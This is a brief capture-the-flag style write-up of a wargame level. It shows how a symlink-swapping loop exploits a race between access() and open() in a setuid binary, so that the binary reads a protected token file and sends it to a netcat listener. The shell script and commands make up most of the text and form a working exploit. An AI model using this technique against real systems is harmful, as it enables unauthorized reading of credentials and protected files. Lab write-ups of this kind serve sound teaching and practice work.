There is a program that sends a file to address listening in port 6969. We can
test this by creating a file with some text and opening another terminal with
netcat in listening and continuous mode:

```nc -lk 6969```

After inspecting the binary there is a call to the access function to check for
user rights, if it passes it will open it and send it. We have to exploit this,
one option is to create a while loop and continuously change a symlink from a
file which I have permission to the token file, that way the access function
will work and when the open function is called the new symlink will be there.

Let's make a basic shell script to do this:
````
touch /tmp/fake
while true
do
	ln -sf /home/user/level10/token /tmp/tolkien
	ln -sf /tmp/fake /tmp/tolkien
done
```

Then after launching the program a few times we will open the file correctly:

```./level10 /tmp/tolkien 127.0.0.1 ```
